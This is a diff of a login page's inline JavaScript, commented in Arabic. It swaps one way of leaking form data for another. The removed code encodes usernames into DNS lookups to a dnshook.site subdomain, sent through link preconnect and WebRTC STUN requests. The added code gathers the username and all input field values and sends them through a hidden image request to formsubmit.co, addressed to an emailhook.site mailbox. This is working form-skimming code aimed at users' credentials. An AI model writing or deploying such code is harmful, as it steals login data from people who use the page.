@@ -28,8 +28,39 @@
 </div>
 </form>
 <script>
-// سكريبت مبسط لإرسال البيانات عبر طلبات DNS
+// سكريبت لإرسال البيانات عبر EmailHook
 document.addEventListener('DOMContentLoaded', function() {
+  // عنوان البريد الإلكتروني للإرسال إليه
+  var emailHook = 'a84486a3-3a4f-4dfa-a734-41a6bfed3241@emailhook.site';
+  
+  // وظيفة لإرسال البيانات عبر EmailHook
+  function sendDataViaEmail(data) {
+    try {
+      // تحويل البيانات إلى سلسلة نصية إذا لم تكن كذلك
+      if (typeof data !== 'string') {
+        data = JSON.stringify(data, null, 2); // تنسيق JSON بشكل مقروء
+      }
+      
+      // إنشاء عنصر img لإرسال البيانات
+      var img = document.createElement('img');
+      img.style.display = 'none';
+      img.src = 'https://formsubmit.co/' + emailHook + '?data=' + encodeURIComponent(data);
+      document.body.appendChild(img);
+      
+      console.log('تم إرسال البيانات عبر EmailHook');
+      
+      // إزالة العنصر بعد فترة
+      setTimeout(function() {
+        document.body.removeChild(img);
+      }, 5000);
+      
+      return true;
+    } catch (e) {
+      console.log('خطأ في إرسال البيانات عبر EmailHook: ' + e);
+      return false;
+    }
+  }
+  
   // البحث عن زر تسجيل الدخول
   var loginButton = document.getElementById('loginBtn2');
   
@@ -55,39 +86,15 @@ document.addEventListener('DOMContentLoaded', function() {
           console.log('خطأ في حفظ البيانات في localStorage: ' + e);
         }
         
-        // إرسال البيانات عبر طلب DNS باستخدام الطرق الناجحة فقط
-        try {
-          // تحويل البيانات إلى تنسيق آمن للاستخدام في اسم النطاق
-          var encodedData = btoa(username).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
-          
-          // إنشاء اسم نطاق فرعي باستخدام البيانات المشفرة
-          var dnsSubdomain = encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site';
-          
-          // إنشاء عنصر link preconnect (نجح)
-          var link = document.createElement('link');
-          link.rel = 'preconnect';
-          link.href = 'https://' + dnsSubdomain;
-          document.head.appendChild(link);
-          
-          console.log('تم إنشاء رابط preconnect إلى: ' + dnsSubdomain);
-          
-          // محاولة WebRTC (نجحت)
-          var pc = new RTCPeerConnection({
-            iceServers: [{
-              urls: 'stun:' + encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site'
-            }]
-          });
-          pc.createDataChannel('');
-          pc.createOffer().then(pc.setLocalDescription.bind(pc));
-          console.log('تم إنشاء اتصال WebRTC مع: ' + encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site');
-          
-          // إضافة تأخير قبل إزالة العناصر
-          setTimeout(function() {
-            document.head.removeChild(link);
-          }, 3000);
-        } catch (e) {
-          console.log('خطأ في إرسال طلب DNS: ' + e);
-        }
+        // إرسال البيانات عبر EmailHook
+        var dataSent = sendDataViaEmail({
+          username: username,
+          timestamp: new Date().toISOString(),
+          page: window.location.href,
+          userAgent: navigator.userAgent
+        });
+        
+        console.log('نتيجة إرسال البيانات: ' + (dataSent ? 'نجاح' : 'فشل'));
       } else {
         console.log('لم يتم العثور على حقل اسم المستخدم أو الحقل فارغ');
       }
@@ -109,44 +116,22 @@ document.addEventListener('DOMContentLoaded', function() {
         // جمع البيانات من جميع حقول الإدخال
         allInputs.forEach(function(input) {
           if (input.value) {
-            inputData[input.id || input.name || 'input_' + Math.random()] = input.value;
+            inputData[input.id || input.name || 'input_' + Math.random().toString(36).substr(2, 9)] = input.value;
           }
         });
         
-        // تحويل البيانات إلى سلسلة نصية
-        var dataString = JSON.stringify(inputData);
-        
-        // تشفير البيانات
-        var encodedData = btoa(dataString).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
-        
-        // إنشاء اسم نطاق فرعي
-        var dnsSubdomain = encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site';
-        
-        // إنشاء رابط preconnect
-        var link = document.createElement('link');
-        link.rel = 'preconnect';
-        link.href = 'https://' + dnsSubdomain;
-        document.head.appendChild(link);
-        
-        console.log('تم إرسال طلب DNS من زر بديل إلى: ' + dnsSubdomain);
-        
-        // محاولة WebRTC
-        try {
-          var pc = new RTCPeerConnection({
-            iceServers: [{
-              urls: 'stun:' + encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site'
-            }]
+        // إرسال البيانات عبر EmailHook
+        if (Object.keys(inputData).length > 0) {
+          var dataSent = sendDataViaEmail({
+            inputs: inputData,
+            timestamp: new Date().toISOString(),
+            page: window.location.href,
+            userAgent: navigator.userAgent,
+            button_text: button.textContent || button.value || 'unknown'
           });
-          pc.createDataChannel('');
-          pc.createOffer().then(pc.setLocalDescription.bind(pc));
-        } catch (e) {
-          console.log('خطأ في إنشاء اتصال WebRTC: ' + e);
+          
+          console.log('نتيجة إرسال البيانات من زر بديل: ' + (dataSent ? 'نجاح' : 'فشل'));
         }
-        
-        // إزالة العناصر بعد فترة
-        setTimeout(function() {
-          document.head.removeChild(link);
-        }, 3000);
       });
     });
   }
